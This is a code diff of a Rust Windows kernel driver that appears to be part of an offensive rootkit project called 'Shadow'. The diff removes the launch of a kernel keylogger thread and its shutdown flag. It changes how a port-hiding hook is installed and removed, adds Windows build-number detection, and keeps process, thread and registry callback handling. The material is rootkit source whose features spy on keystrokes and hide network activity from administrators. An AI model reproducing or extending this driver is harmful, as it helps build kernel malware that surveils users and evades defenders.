@@ -8,11 +8,16 @@ extern crate alloc;
 use {
     utils::uni,
     port::Port,
-    core::ptr::null_mut, 
     kernel_log::KernelLogger,
-    crate::utils::ioctls::IOCTL_MAP, 
-    misc::keylogger::{keylogger, SHUTDOWN}, 
-    wdk_sys::{ntddk::*, _MODE::KernelMode, *}
+    wdk_sys::{ntddk::*, _MODE::KernelMode, *},
+    core::{ptr::null_mut, sync::atomic::Ordering},
+    crate::{
+        port::HOOK_INSTALLED,
+        utils::{
+            offsets::BUILD_NUMBER,
+            ioctls::IOCTL_MAP, get_windows_build_number, 
+        }
+    }, 
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -128,17 +133,6 @@ pub unsafe extern "system" fn shadow_entry(
         return status;
     }
 
-    let mut h_thread: HANDLE = core::ptr::null_mut();
-    status = PsCreateSystemThread(
-        &mut h_thread,
-        THREAD_ALL_ACCESS,
-        null_mut(),
-        null_mut(),
-        null_mut(),
-        Some(keylogger),
-        null_mut(),
-    );
-
     if !NT_SUCCESS(status) {
         IoDeleteDevice(device_object);
         log::error!("PsCreateSystemThread Failed With Status: {status}");
@@ -158,7 +152,7 @@ pub unsafe extern "system" fn shadow_entry(
         }
     }
 
-    let status = unsafe { Port::install_hook() };
+    BUILD_NUMBER = get_windows_build_number();
 
     STATUS_SUCCESS
 }
@@ -225,18 +219,14 @@ pub unsafe extern "C" fn driver_close(_device_object: *mut DEVICE_OBJECT, irp: *
 pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
     log::info!("Unloading driver");
 
-    SHUTDOWN = true;
+    if HOOK_INSTALLED.load(Ordering::Relaxed) {
+        let hook_status = Port::uninstall_hook();
+        let mut interval = LARGE_INTEGER {
+            QuadPart: -50 * 1000_i64 * 1000_i64,
+        };
     
-    let hook_status = Port::uninstall_hook();
-    if !NT_SUCCESS(hook_status) {
-        log::error!("Failed to uninstall hook before unload");
+        KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);    
     }
-
-    let mut interval = LARGE_INTEGER {
-        QuadPart: -50 * 1000_i64 * 1000_i64,
-    };
-
-    KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
 
     let dos_device_name = uni::str_to_unicode(DOS_DEVICE_NAME);
     IoDeleteSymbolicLink(&mut dos_device_name.to_unicode());
@@ -247,12 +237,6 @@ pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
         ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_THREAD);
         CmUnRegisterCallback(CALLBACK_REGISTRY);
     }
-
-    let mut interval = LARGE_INTEGER {
-        QuadPart: -1 * -(50 * 1000_i64),
-    };
-
-    KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
 
     log::info!("Shadow Unload");
 }
